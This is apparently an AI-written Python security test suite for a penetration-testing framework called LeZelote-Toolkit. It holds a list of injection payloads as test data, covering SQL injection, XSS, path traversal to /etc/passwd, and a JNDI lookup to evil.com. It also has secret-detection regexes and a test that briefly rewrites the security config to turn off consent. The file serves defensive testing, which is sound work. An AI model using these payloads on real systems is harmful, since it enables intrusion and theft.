#!/usr/bin/env python3
"""
LeZelote-Toolkit Security & Penetration Testing Suite
====================================================

Comprehensive security testing and penetration testing of the LeZelote-Toolkit
framework itself. Tests for vulnerabilities, security misconfigurations, and
compliance with security best practices.

Author: Security Testing Agent
Version: 1.0.0
Date: January 18, 2025
"""

import sys
import os
import re
import json
import hashlib
import subprocess
import tempfile
import sqlite3
import yaml
from pathlib import Path
from typing import Dict, List, Any, Optional
import requests
import time
import threading
import socket
from unittest.mock import patch

# Add project root to Python path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

# Security testing imports
try:
    import bandit
    from bandit.core import manager as bandit_manager
    from bandit.core import config as bandit_config
except ImportError:
    print("⚠️  Bandit not available - installing...")
    subprocess.run([sys.executable, "-m", "pip", "install", "bandit"], check=True)
    import bandit
    from bandit.core import manager as bandit_manager
    from bandit.core import config as bandit_config

try:
    import safety
except ImportError:
    print("⚠️  Safety not available - installing...")
    subprocess.run([sys.executable, "-m", "pip", "install", "safety"], check=True)
    import safety

# Framework imports
try:
    from core.security.crypto_handler import CryptoHandler
    from core.security.consent_manager import ConsentManager
    from core.security.stealth_engine import StealthEngine
    from core.security.evasion_tactics import EvasionTactics
    from core.db.sqlite_manager import SQLiteManager
    from core.utils.logging_handler import get_logger
    print("✅ Security module imports successful")
except ImportError as e:
    print(f"❌ Security module import error: {e}")


class SecurityTestSuite:
    """Comprehensive security testing suite"""
    
    def __init__(self):
        self.logger = get_logger("SecurityTestSuite")
        self.test_results = []
        self.vulnerabilities = []
        self.security_score = 0
        self.max_score = 0
        
        print("🔒 Initializing LeZelote-Toolkit Security Testing Suite")
        print("=" * 60)
    
    def run_all_security_tests(self):
        """Execute all security tests"""
        test_categories = [
            ("🔍 Code Security Analysis", self.test_code_security),
            ("🔐 Cryptography Testing", self.test_cryptography_security),
            ("📋 Configuration Security", self.test_configuration_security),
            ("🗄️ Database Security", self.test_database_security),
            ("🛡️ Authentication & Authorization", self.test_auth_security),
            ("🌐 Network Security", self.test_network_security),
            ("📝 Input Validation & Injection", self.test_input_security),
            ("🚨 Error Handling Security", self.test_error_handling),
            ("📊 Logging Security", self.test_logging_security),
            ("🔧 Dependency Security", self.test_dependency_security),
            ("⚡ DoS & Robustness Testing", self.test_dos_robustness),
            ("📁 File System Security", self.test_filesystem_security),
            ("🎯 Penetration Testing", self.test_penetration_scenarios)
        ]
        
        for category_name, test_function in test_categories:
            print(f"\n{category_name}")
            print("-" * 50)
            try:
                test_function()
            except Exception as e:
                self.logger.error(f"Test category failed: {category_name} - {str(e)}")
                self.add_vulnerability("CRITICAL", f"Test execution failure in {category_name}", str(e))
        
        self.generate_security_report()
    
    def test_code_security(self):
        """Test 1: Static code analysis for security vulnerabilities"""
        print("🔍 Running static code analysis with Bandit...")
        
        try:
            # Configure Bandit
            conf = bandit_config.BanditConfig()
            b_mgr = bandit_manager.BanditManager(conf, 'file')
            
            # Scan Python files
            python_files = list(Path("/app").rglob("*.py"))
            
            vulnerabilities_found = 0
            high_severity = 0
            medium_severity = 0
            
            for py_file in python_files[:20]:  # Limit to avoid timeout
                try:
                    b_mgr.discover([str(py_file)])
                    b_mgr.run_tests()
                    
                    for issue in b_mgr.get_issue_list():
                        vulnerabilities_found += 1
                        if issue.severity == 'HIGH':
                            high_severity += 1
                            self.add_vulnerability("HIGH", f"Bandit: {issue.test}", 
                                                 f"File: {issue.fname}, Line: {issue.lineno}")
                        elif issue.severity == 'MEDIUM':
                            medium_severity += 1
                            self.add_vulnerability("MEDIUM", f"Bandit: {issue.test}", 
                                                 f"File: {issue.fname}, Line: {issue.lineno}")
                    
                    b_mgr._init_plugins()  # Reset for next file
                    
                except Exception as e:
                    continue
            
            # Check for hardcoded secrets
            secrets_found = self.scan_for_hardcoded_secrets()
            
            print(f"   📊 Static Analysis Results:")
            print(f"      • Files scanned: {len(python_files)}")
            print(f"      • Vulnerabilities found: {vulnerabilities_found}")
            print(f"      • High severity: {high_severity}")
            print(f"      • Medium severity: {medium_severity}")
            print(f"      • Hardcoded secrets: {secrets_found}")
            
            # Score calculation
            if high_severity == 0 and medium_severity < 5:
                self.add_score(15, 15)
                print("   ✅ Code security: GOOD")
            elif high_severity < 3:
                self.add_score(10, 15)
                print("   ⚠️  Code security: MODERATE")
            else:
                self.add_score(5, 15)
                print("   ❌ Code security: POOR")
                
        except Exception as e:
            self.add_vulnerability("CRITICAL", "Static analysis failed", str(e))
            self.add_score(0, 15)
    
    def scan_for_hardcoded_secrets(self) -> int:
        """Scan for hardcoded secrets and credentials"""
        secret_patterns = [
            r'password\s*=\s*["\'][^"\']{3,}["\']',
            r'api_key\s*=\s*["\'][^"\']{10,}["\']',
            r'secret\s*=\s*["\'][^"\']{10,}["\']',
            r'token\s*=\s*["\'][^"\']{10,}["\']',
            r'["\'][A-Za-z0-9]{32,}["\']',  # Long strings that might be keys
        ]
        
        secrets_found = 0
        python_files = list(Path("/app").rglob("*.py"))
        
        for py_file in python_files:
            try:
                content = py_file.read_text(encoding='utf-8', errors='ignore')
                for pattern in secret_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        # Filter out obvious test/placeholder values
                        real_secrets = [m for m in matches if not any(placeholder in m.lower() 
                                      for placeholder in ['test', 'example', 'placeholder', 'your_', 'dummy'])]
                        if real_secrets:
                            secrets_found += len(real_secrets)
                            self.add_vulnerability("HIGH", "Hardcoded secret detected", 
                                                 f"File: {py_file}, Matches: {len(real_secrets)}")
            except Exception:
                continue
        
        return secrets_found
    
    def test_cryptography_security(self):
        """Test 2: Cryptographic implementation security"""
        print("🔐 Testing cryptographic security...")
        
        try:
            # Test CryptoHandler
            crypto = CryptoHandler()
            
            # Test encryption/decryption
            test_data = "sensitive_test_data_12345"
            encrypted = crypto.encrypt_data(test_data)
            decrypted = crypto.decrypt_data(encrypted)
            
            if decrypted == test_data:
                print("   ✅ Encryption/decryption working")
                self.add_score(5, 5)
            else:
                self.add_vulnerability("HIGH", "Encryption/decryption failure", "Data integrity compromised")
                self.add_score(0, 5)
            
            # Test hash functions
            hash_result = crypto.hash_data(test_data)
            if len(hash_result) == 64:  # SHA-256 produces 64 char hex
                print("   ✅ Hash function working")
                self.add_score(3, 3)
            else:
                self.add_vulnerability("MEDIUM", "Hash function issue", "Unexpected hash length")
                self.add_score(1, 3)
            
            # Test key generation security
            key1 = crypto.fernet._signing_key
            crypto2 = CryptoHandler()
            key2 = crypto2.fernet._signing_key
            
            if key1 != key2:
                print("   ✅ Key generation is random")
                self.add_score(2, 2)
            else:
                self.add_vulnerability("CRITICAL", "Weak key generation", "Keys are not random")
                self.add_score(0, 2)
                
        except Exception as e:
            self.add_vulnerability("CRITICAL", "Cryptography test failed", str(e))
            self.add_score(0, 10)
    
    def test_configuration_security(self):
        """Test 3: Configuration file security"""
        print("📋 Testing configuration security...")
        
        config_files = [
            "/app/config/security_settings.yaml",
            "/app/config/api_keys.yaml",
            "/app/config/main_config.yaml"
        ]
        
        secure_configs = 0
        total_configs = len(config_files)
        
        for config_file in config_files:
            try:
                if Path(config_file).exists():
                    # Check file permissions
                    stat_info = os.stat(config_file)
                    permissions = oct(stat_info.st_mode)[-3:]
                    
                    if permissions in ['600', '640', '644']:
                        print(f"   ✅ {Path(config_file).name}: Secure permissions ({permissions})")
                        secure_configs += 1
                    else:
                        self.add_vulnerability("MEDIUM", f"Insecure file permissions", 
                                             f"File: {config_file}, Permissions: {permissions}")
                    
                    # Check for sensitive data exposure
                    content = Path(config_file).read_text()
                    if 'YOUR_' in content and 'API_KEY' in content:
                        print(f"   ✅ {Path(config_file).name}: Uses placeholder values")
                    elif re.search(r'[A-Za-z0-9]{20,}', content):
                        self.add_vulnerability("HIGH", "Potential API key in config", 
                                             f"File: {config_file}")
                        
            except Exception as e:
                self.add_vulnerability("MEDIUM", f"Config file access error", str(e))
        
        score = int((secure_configs / total_configs) * 10)
        self.add_score(score, 10)
        print(f"   📊 Configuration security score: {score}/10")
    
    def test_database_security(self):
        """Test 4: Database security"""
        print("🗄️ Testing database security...")
        
        try:
            # Test SQLite database security
            with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as tmp:
                test_db_path = tmp.name
            
            db_manager = SQLiteManager(test_db_path)
            db_manager.initialize_database()
            
            # Test SQL injection protection
            injection_attempts = [
                "'; DROP TABLE projects; --",
                "' OR '1'='1",
                "'; INSERT INTO projects VALUES ('hack', 'test'); --"
            ]
            
            injection_blocked = 0
            for injection in injection_attempts:
                try:
                    result = db_manager.execute_query(
                        "SELECT * FROM projects WHERE name = ?", (injection,)
                    )
                    injection_blocked += 1  # Parameterized queries should prevent injection
                except Exception:
                    pass  # Expected for malicious queries
            
            if injection_blocked == len(injection_attempts):
                print("   ✅ SQL injection protection working")
                self.add_score(8, 8)
            else:
                self.add_vulnerability("HIGH", "SQL injection vulnerability", 
                                     f"Blocked: {injection_blocked}/{len(injection_attempts)}")
                self.add_score(4, 8)
            
            # Test database file permissions
            stat_info = os.stat(test_db_path)
            permissions = oct(stat_info.st_mode)[-3:]
            
            if permissions in ['600', '640']:
                print("   ✅ Database file permissions secure")
                self.add_score(2, 2)
            else:
                self.add_vulnerability("MEDIUM", "Insecure database permissions", 
                                     f"Permissions: {permissions}")
                self.add_score(1, 2)
            
            # Cleanup
            os.unlink(test_db_path)
            
        except Exception as e:
            self.add_vulnerability("CRITICAL", "Database security test failed", str(e))
            self.add_score(0, 10)
    
    def test_auth_security(self):
        """Test 5: Authentication and authorization security"""
        print("🛡️ Testing authentication & authorization...")
        
        try:
            # Test ConsentManager
            consent_mgr = ConsentManager()
            
            # Test consent verification
            test_target = "test-security.local"
            
            # Should fail without consent
            if not consent_mgr.verify_consent(test_target):
                print("   ✅ Unauthorized access properly blocked")
                self.add_score(5, 5)
            else:
                self.add_vulnerability("HIGH", "Authorization bypass", "Access granted without consent")
                self.add_score(0, 5)
            
            # Add consent and test
            consent_id = consent_mgr.add_consent(
                target=test_target,
                scope=["network_scan", "web_scan"],
                authorization_doc="/tmp/test_auth.txt",
                contact_info={"email": "test@example.com"}
            )
            
            if consent_mgr.verify_consent(test_target, "network_scan"):
                print("   ✅ Authorized access working")
                self.add_score(3, 3)
            else:
                self.add_vulnerability("MEDIUM", "Authorization failure", "Valid consent not recognized")
                self.add_score(1, 3)
            
            # Test consent restrictions
            if not consent_mgr.verify_consent(test_target, "unauthorized_scope"):
                print("   ✅ Scope restrictions working")
                self.add_score(2, 2)
            else:
                self.add_vulnerability("HIGH", "Scope bypass", "Unauthorized scope allowed")
                self.add_score(0, 2)
                
        except Exception as e:
            self.add_vulnerability("CRITICAL", "Auth security test failed", str(e))
            self.add_score(0, 10)
    
    def test_network_security(self):
        """Test 6: Network security"""
        print("🌐 Testing network security...")
        
        try:
            # Test stealth engine
            stealth = StealthEngine()
            
            # Test command execution security
            safe_command = "echo 'test'"
            result = stealth.execute_stealth(safe_command)
            
            if result['success'] and 'test' in result['stdout']:
                print("   ✅ Stealth execution working")
                self.add_score(3, 3)
            else:
                self.add_vulnerability("MEDIUM", "Stealth execution failure", "Command execution issues")
                self.add_score(1, 3)
            
            # Test evasion tactics
            evasion = EvasionTactics()
            user_agent = evasion.get_random_user_agent()
            
            if user_agent and len(user_agent) > 20:
                print("   ✅ User agent randomization working")
                self.add_score(2, 2)
            else:
                self.add_vulnerability("LOW", "User agent issue", "Weak user agent randomization")
                self.add_score(1, 2)
            
            # Test timing evasion (quick test)
            start_time = time.time()
            evasion.apply_timing_evasion(0.1, 0.2)
            elapsed = time.time() - start_time
            
            if 0.1 <= elapsed <= 0.3:
                print("   ✅ Timing evasion working")
                self.add_score(2, 2)
            else:
                self.add_vulnerability("LOW", "Timing evasion issue", f"Unexpected delay: {elapsed}")
                self.add_score(1, 2)
            
            # Test for open ports (security risk)
            open_ports = self.scan_open_ports()
            if len(open_ports) < 5:
                print(f"   ✅ Limited open ports: {len(open_ports)}")
                self.add_score(3, 3)
            else:
                self.add_vulnerability("MEDIUM", "Too many open ports", f"Open ports: {open_ports}")
                self.add_score(1, 3)
                
        except Exception as e:
            self.add_vulnerability("CRITICAL", "Network security test failed", str(e))
            self.add_score(0, 10)
    
    def scan_open_ports(self) -> List[int]:
        """Scan for open ports on localhost"""
        open_ports = []
        common_ports = [22, 80, 443, 3000, 5000, 8000, 8080, 8001]
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('127.0.0.1', port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        
        return open_ports
    
    def test_input_security(self):
        """Test 7: Input validation and injection testing"""
        print("📝 Testing input validation & injection protection...")
        
        injection_payloads = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%0d%0aSet-Cookie:%20malicious=true"
        ]
        
        # Test various input points
        try:
            from core.engine.orchestrator import PentestOrchestrator
            
            orchestrator = PentestOrchestrator(target="test.local", profile="quick")
            
            blocked_injections = 0
            total_tests = len(injection_payloads)
            
            for payload in injection_payloads:
                try:
                    # Test target input validation
                    test_orchestrator = PentestOrchestrator(target=payload, profile="quick")
                    # If no exception, input was accepted (potential vulnerability)
                    
                    # Test project config injection
                    project_config = {
                        'name': payload,
                        'target': 'test.local',
                        'profile': 'quick',
                        'description': payload
                    }
                    
                    result = orchestrator.initialize_project(project_config)
                    
                    # Check if payload was sanitized or blocked
                    if payload not in str(result):
                        blocked_injections += 1
                        
                except Exception:
                    blocked_injections += 1  # Exception means input was rejected
            
            protection_rate = (blocked_injections / total_tests) * 100
            
            if protection_rate >= 80:
                print(f"   ✅ Input validation: {protection_rate:.1f}% protection")
                self.add_score(8, 10)
            elif protection_rate >= 60:
                print(f"   ⚠️  Input validation: {protection_rate:.1f}% protection")
                self.add_score(6, 10)
                self.add_vulnerability("MEDIUM", "Weak input validation", 
                                     f"Only {protection_rate:.1f}% of injections blocked")
            else:
                print(f"   ❌ Input validation: {protection_rate:.1f}% protection")
                self.add_score(3, 10)
                self.add_vulnerability("HIGH", "Poor input validation", 
                                     f"Only {protection_rate:.1f}% of injections blocked")
                
        except Exception as e:
            self.add_vulnerability("CRITICAL", "Input security test failed", str(e))
            self.add_score(0, 10)
    
    def test_error_handling(self):
        """Test 8: Error handling security"""
        print("🚨 Testing error handling security...")
        
        try:
            # Test if errors leak sensitive information
            from core.db.sqlite_manager import SQLiteManager
            
            # Try to access non-existent database
            try:
                db = SQLiteManager("/nonexistent/path/test.db")
                db.execute_query("SELECT * FROM nonexistent_table")
            except Exception as e:
                error_msg = str(e)
                
                # Check for information leakage
                sensitive_patterns = [
                    r'/home/[^/]+',  # Home directory paths
                    r'/app/[^/]+',   # Application paths
                    r'password',     # Password mentions
                    r'secret',       # Secret mentions
                    r'key',          # Key mentions
                ]
                
                leaks_found = 0
                for pattern in sensitive_patterns:
                    if re.search(pattern, error_msg, re.IGNORECASE):
                        leaks_found += 1
                
                if leaks_found == 0:
                    print("   ✅ Error messages don't leak sensitive info")
                    self.add_score(5, 5)
                else:
                    print(f"   ⚠️  Error messages may leak info: {leaks_found} patterns found")
                    self.add_vulnerability("MEDIUM", "Information leakage in errors", 
                                         f"Sensitive patterns found: {leaks_found}")
                    self.add_score(2, 5)
            
            # Test exception handling robustness
            error_scenarios = [
                lambda: 1/0,  # Division by zero
                lambda: [][1],  # Index error
                lambda: {}['nonexistent'],  # Key error
            ]
            
            handled_errors = 0
            for scenario in error_scenarios:
                try:
                    scenario()
                except Exception:
                    handled_errors += 1
            
            if handled_errors == len(error_scenarios):
                print("   ✅ Exception handling working")
                self.add_score(5, 5)
            else:
                self.add_vulnerability("LOW", "Unhandled exceptions", 
                                     f"Handled: {handled_errors}/{len(error_scenarios)}")
                self.add_score(3, 5)
                
        except Exception as e:
            self.add_vulnerability("CRITICAL", "Error handling test failed", str(e))
            self.add_score(0, 10)
    
    def test_logging_security(self):
        """Test 9: Logging security"""
        print("📊 Testing logging security...")
        
        try:
            logger = get_logger("SecurityTest")
            
            # Test if sensitive data is logged
            sensitive_data = "password123"
            api_key = "sk-1234567890abcdef"
            
            logger.info(f"Test message with {sensitive_data}")
            logger.info(f"API key: {api_key}")
            
            # Check log files for sensitive data
            log_files = list(Path("/app/logs").glob("*.log"))
            
            sensitive_in_logs = 0
            for log_file in log_files:
                try:
                    content = log_file.read_text()
                    if sensitive_data in content or api_key in content:
                        sensitive_in_logs += 1
                        self.add_vulnerability("HIGH", "Sensitive data in logs", 
                                             f"File: {log_file}")
                except Exception:
                    continue
            
            if sensitive_in_logs == 0:
                print("   ✅ No sensitive data found in logs")
                self.add_score(5, 5)
            else:
                print(f"   ❌ Sensitive data found in {sensitive_in_logs} log files")
                self.add_score(2, 5)
            
            # Test log file permissions
            secure_logs = 0
            for log_file in log_files:
                try:
                    stat_info = os.stat(log_file)
                    permissions = oct(stat_info.st_mode)[-3:]
                    if permissions in ['600', '640', '644']:
                        secure_logs += 1
                except Exception:
                    continue
            
            if log_files and secure_logs == len(log_files):
                print("   ✅ Log file permissions secure")
                self.add_score(5, 5)
            elif log_files:
                print(f"   ⚠️  Some log files have insecure permissions")
                self.add_vulnerability("MEDIUM", "Insecure log permissions", 
                                     f"Secure: {secure_logs}/{len(log_files)}")
                self.add_score(3, 5)
            else:
                print("   ℹ️  No log files found")
                self.add_score(5, 5)
                
        except Exception as e:
            self.add_vulnerability("CRITICAL", "Logging security test failed", str(e))
            self.add_score(0, 10)
    
    def test_dependency_security(self):
        """Test 10: Dependency security analysis"""
        print("🔧 Testing dependency security...")
        
        try:
            # Check requirements.txt for known vulnerabilities
            requirements_file = Path("/app/requirements.txt")
            
            if requirements_file.exists():
                print("   📋 Analyzing dependencies for vulnerabilities...")
                
                # Run safety check (if available)
                try:
                    result = subprocess.run([
                        sys.executable, "-m", "safety", "check", 
                        "-r", str(requirements_file), "--json"
                    ], capture_output=True, text=True, timeout=30)
                    
                    if result.returncode == 0:
                        vulnerabilities = json.loads(result.stdout) if result.stdout else []
                        
                        if not vulnerabilities:
                            print("   ✅ No known vulnerabilities in dependencies")
                            self.add_score(10, 10)
                        else:
                            print(f"   ❌ Found {len(vulnerabilities)} vulnerable dependencies")
                            for vuln in vulnerabilities[:5]:  # Show first 5
                                self.add_vulnerability("HIGH", "Vulnerable dependency", 
                                                     f"Package: {vuln.get('package', 'unknown')}")
                            self.add_score(5, 10)
                    else:
                        print("   ⚠️  Safety check failed, manual review needed")
                        self.add_score(7, 10)
                        
                except subprocess.TimeoutExpired:
                    print("   ⚠️  Dependency check timed out")
                    self.add_score(7, 10)
                except Exception as e:
                    print(f"   ⚠️  Dependency check error: {str(e)}")
                    self.add_score(7, 10)
            else:
                print("   ⚠️  No requirements.txt found")
                self.add_score(5, 10)
                
        except Exception as e:
            self.add_vulnerability("CRITICAL", "Dependency security test failed", str(e))
            self.add_score(0, 10)
    
    def test_dos_robustness(self):
        """Test 11: DoS and robustness testing"""
        print("⚡ Testing DoS resistance & robustness...")
        
        try:
            # Test resource exhaustion resistance
            from core.engine.task_scheduler import TaskScheduler
            
            config = {'global': {'max_concurrent_tasks': 2}}
            scheduler = TaskScheduler(config)
            
            # Try to overwhelm with tasks
            def dummy_task():
                time.sleep(0.1)
                return "done"
            
            from core.engine.task_scheduler import Task, TaskPriority
            
            # Add many tasks quickly
            for i in range(20):
                task = Task(
                    id=f"dos_test_{i}",
                    name=f"DoS Test Task {i}",
                    func=dummy_task,
                    priority=TaskPriority.NORMAL
                )
                scheduler.add_task(task)
            
            scheduler.start_scheduler()
            
            # Check if system remains responsive
            start_time = time.time()
            completed = scheduler.wait_for_completion(timeout=10)
            end_time = time.time()
            
            scheduler.stop_scheduler()
            
            if completed and (end_time - start_time) < 15:
                print("   ✅ DoS resistance: System handled load well")
                self.add_score(8, 10)
            elif completed:
                print("   ⚠️  DoS resistance: System slow under load")
                self.add_score(6, 10)
                self.add_vulnerability("MEDIUM", "Performance degradation", "Slow under load")
            else:
                print("   ❌ DoS resistance: System failed under load")
                self.add_score(3, 10)
                self.add_vulnerability("HIGH", "DoS vulnerability", "System failed under load")
            
            # Test memory usage
            import psutil
            process = psutil.Process()
            memory_mb = process.memory_info().rss / 1024 / 1024
            
            if memory_mb < 500:  # Less than 500MB
                print(f"   ✅ Memory usage reasonable: {memory_mb:.1f}MB")
                self.add_score(2, 2)
            else:
                print(f"   ⚠️  High memory usage: {memory_mb:.1f}MB")
                self.add_vulnerability("LOW", "High memory usage", f"{memory_mb:.1f}MB")
                self.add_score(1, 2)
                
        except Exception as e:
            self.add_vulnerability("CRITICAL", "DoS robustness test failed", str(e))
            self.add_score(0, 12)
    
    def test_filesystem_security(self):
        """Test 12: File system security"""
        print("📁 Testing file system security...")
        
        try:
            # Check critical file permissions
            critical_files = [
                "/app/config/api_keys.yaml",
                "/app/config/security_settings.yaml",
                "/app/core/security/crypto_handler.py"
            ]
            
            secure_files = 0
            for file_path in critical_files:
                if Path(file_path).exists():
                    stat_info = os.stat(file_path)
                    permissions = oct(stat_info.st_mode)[-3:]
                    
                    if permissions in ['600', '640', '644']:
                        secure_files += 1
                    else:
                        self.add_vulnerability("MEDIUM", "Insecure file permissions", 
                                             f"File: {file_path}, Permissions: {permissions}")
            
            if secure_files == len([f for f in critical_files if Path(f).exists()]):
                print("   ✅ Critical file permissions secure")
                self.add_score(5, 5)
            else:
                print("   ⚠️  Some critical files have insecure permissions")
                self.add_score(3, 5)
            
            # Test directory traversal protection
            traversal_attempts = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ]
            
            # Test with file operations
            from core.utils.file_ops import FileOperations
            file_ops = FileOperations()
            
            blocked_attempts = 0
            for attempt in traversal_attempts:
                try:
                    # This should fail or be sanitized
                    result = file_ops.read_file(attempt)
                    if not result or "root:" not in str(result):
                        blocked_attempts += 1
                except Exception:
                    blocked_attempts += 1  # Exception means blocked
            
            if blocked_attempts == len(traversal_attempts):
                print("   ✅ Directory traversal protection working")
                self.add_score(5, 5)
            else:
                print(f"   ❌ Directory traversal vulnerability: {blocked_attempts}/{len(traversal_attempts)} blocked")
                self.add_vulnerability("HIGH", "Directory traversal vulnerability", 
                                     f"Blocked: {blocked_attempts}/{len(traversal_attempts)}")
                self.add_score(2, 5)
                
        except Exception as e:
            self.add_vulnerability("CRITICAL", "Filesystem security test failed", str(e))
            self.add_score(0, 10)
    
    def test_penetration_scenarios(self):
        """Test 13: Penetration testing scenarios"""
        print("🎯 Running penetration testing scenarios...")
        
        try:
            # Scenario 1: Unauthorized tool execution
            print("   🔍 Testing unauthorized tool execution...")
            
            from core.engine.orchestrator import PentestOrchestrator
            
            # Try to execute without proper consent
            orchestrator = PentestOrchestrator(target="unauthorized.target", profile="aggressive")
            
            try:
                result = orchestrator.execute_phase('reconnaissance')
                if result.get('success'):
                    self.add_vulnerability("CRITICAL", "Authorization bypass", 
                                         "Reconnaissance executed without consent")
                    self.add_score(0, 5)
                else:
                    print("   ✅ Unauthorized execution blocked")
                    self.add_score(5, 5)
            except Exception:
                print("   ✅ Unauthorized execution blocked by exception")
                self.add_score(5, 5)
            
            # Scenario 2: Configuration tampering
            print("   🔧 Testing configuration tampering...")
            
            config_file = "/app/config/security_settings.yaml"
            if Path(config_file).exists():
                try:
                    # Try to modify security settings
                    with open(config_file, 'r') as f:
                        original_content = f.read()
                    
                    # Attempt to write malicious config
                    malicious_config = original_content.replace('require_explicit_consent: true', 
                                                              'require_explicit_consent: false')
                    
                    with open(config_file, 'w') as f:
                        f.write(malicious_config)
                    
                    # Restore original
                    with open(config_file, 'w') as f:
                        f.write(original_content)
                    
                    self.add_vulnerability("HIGH", "Configuration tampering possible", 
                                         "Security settings can be modified")
                    self.add_score(2, 5)
                    
                except PermissionError:
                    print("   ✅ Configuration tampering blocked by permissions")
                    self.add_score(5, 5)
                except Exception as e:
                    print(f"   ⚠️  Configuration test inconclusive: {str(e)}")
                    self.add_score(3, 5)
            else:
                print("   ℹ️  Security config file not found")
                self.add_score(3, 5)
            
            # Scenario 3: Data exfiltration attempt
            print("   📤 Testing data exfiltration protection...")
            
            sensitive_files = [
                "/app/data/databases/consent.db",
                "/app/logs/pentest_toolkit.log"
            ]
            
            protected_files = 0
            for file_path in sensitive_files:
                if Path(file_path).exists():
                    try:
                        # Try to read sensitive file
                        with open(file_path, 'rb') as f:
                            data = f.read(1024)  # Read first 1KB
                        
                        # Check if data contains sensitive information
                        if b'password' in data.lower() or b'secret' in data.lower():
                            self.add_vulnerability("HIGH", "Sensitive data accessible", 
                                                 f"File: {file_path}")
                        else:
                            protected_files += 1
                            
                    except PermissionError:
                        protected_files += 1  # Good, file is protected
                    except Exception:
                        protected_files += 1
            
            existing_files = len([f for f in sensitive_files if Path(f).exists()])
            if existing_files > 0 and protected_files == existing_files:
                print("   ✅ Sensitive data protection working")
                self.add_score(5, 5)
            elif existing_files > 0:
                print(f"   ⚠️  Some sensitive data may be accessible")
                self.add_score(3, 5)
            else:
                print("   ℹ️  No sensitive files found to test")
                self.add_score(4, 5)
                
        except Exception as e:
            self.add_vulnerability("CRITICAL", "Penetration testing failed", str(e))
            self.add_score(0, 15)
    
    def add_vulnerability(self, severity: str, title: str, description: str):
        """Add vulnerability to results"""
        self.vulnerabilities.append({
            'severity': severity,
            'title': title,
            'description': description,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        })
    
    def add_score(self, earned: int, maximum: int):
        """Add to security score"""
        self.security_score += earned
        self.max_score += maximum
    
    def generate_security_report(self):
        """Generate comprehensive security report"""
        print("\n" + "=" * 60)
        print("🔒 LEZELOTE-TOOLKIT SECURITY ASSESSMENT REPORT")
        print("=" * 60)
        
        # Overall security score
        if self.max_score > 0:
            score_percentage = (self.security_score / self.max_score) * 100
        else:
            score_percentage = 0
        
        print(f"\n📊 OVERALL SECURITY SCORE: {self.security_score}/{self.max_score} ({score_percentage:.1f}%)")
        
        if score_percentage >= 90:
            print("🟢 SECURITY LEVEL: EXCELLENT")
        elif score_percentage >= 75:
            print("🟡 SECURITY LEVEL: GOOD")
        elif score_percentage >= 60:
            print("🟠 SECURITY LEVEL: MODERATE")
        else:
            print("🔴 SECURITY LEVEL: POOR")
        
        # Vulnerability summary
        critical_vulns = len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL'])
        high_vulns = len([v for v in self.vulnerabilities if v['severity'] == 'HIGH'])
        medium_vulns = len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM'])
        low_vulns = len([v for v in self.vulnerabilities if v['severity'] == 'LOW'])
        
        print(f"\n🚨 VULNERABILITY SUMMARY:")
        print(f"   • Critical: {critical_vulns}")
        print(f"   • High: {high_vulns}")
        print(f"   • Medium: {medium_vulns}")
        print(f"   • Low: {low_vulns}")
        print(f"   • Total: {len(self.vulnerabilities)}")
        
        # Detailed vulnerabilities
        if self.vulnerabilities:
            print(f"\n📋 DETAILED VULNERABILITIES:")
            print("-" * 50)
            
            for vuln in self.vulnerabilities[:20]:  # Show first 20
                severity_icon = {
                    'CRITICAL': '🔴',
                    'HIGH': '🟠',
                    'MEDIUM': '🟡',
                    'LOW': '🟢'
                }.get(vuln['severity'], '⚪')
                
                print(f"{severity_icon} {vuln['severity']} | {vuln['title']}")
                print(f"   └─ {vuln['description']}")
        
        # Security recommendations
        print(f"\n💡 SECURITY RECOMMENDATIONS:")
        print("-" * 50)
        
        if critical_vulns > 0:
            print("🔴 CRITICAL: Address critical vulnerabilities immediately")
        if high_vulns > 0:
            print("🟠 HIGH: Fix high-severity issues before production use")
        if medium_vulns > 5:
            print("🟡 MEDIUM: Review and fix medium-severity issues")
        
        print("✅ Implement regular security testing")
        print("✅ Keep dependencies updated")
        print("✅ Review file permissions regularly")
        print("✅ Monitor logs for suspicious activity")
        print("✅ Implement proper input validation")
        
        # Compliance assessment
        print(f"\n📋 COMPLIANCE ASSESSMENT:")
        print("-" * 50)
        
        if score_percentage >= 80 and critical_vulns == 0:
            print("✅ OWASP Top 10: COMPLIANT")
        else:
            print("❌ OWASP Top 10: NON-COMPLIANT")
        
        if high_vulns == 0 and medium_vulns < 5:
            print("✅ Security Best Practices: GOOD")
        else:
            print("⚠️  Security Best Practices: NEEDS IMPROVEMENT")
        
        print(f"\n🎯 PENETRATION TESTING VERDICT:")
        print("-" * 50)
        
        if score_percentage >= 85 and critical_vulns == 0 and high_vulns < 3:
            print("✅ LeZelote-Toolkit is SECURE for professional penetration testing use")
            print("   Framework demonstrates strong security controls and practices")
        elif score_percentage >= 70 and critical_vulns == 0:
            print("⚠️  LeZelote-Toolkit has MODERATE security - address issues before use")
            print("   Framework is usable but requires security improvements")
        else:
            print("❌ LeZelote-Toolkit has SIGNIFICANT security issues")
            print("   Framework requires major security fixes before professional use")
        
        print("\n" + "=" * 60)
        print("🔒 Security Assessment Complete")
        print("=" * 60)
        
        return {
            'score': score_percentage,
            'vulnerabilities': len(self.vulnerabilities),
            'critical': critical_vulns,
            'high': high_vulns,
            'medium': medium_vulns,
            'low': low_vulns
        }


def main():
    """Main security testing function"""
    print("🔒 LeZelote-Toolkit Security & Penetration Testing Suite")
    print("=" * 60)
    print("🎯 Performing comprehensive security assessment...")
    print("⚠️  This may take several minutes to complete")
    print()
    
    # Initialize and run security tests
    security_suite = SecurityTestSuite()
    security_suite.run_all_security_tests()
    
    return True


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)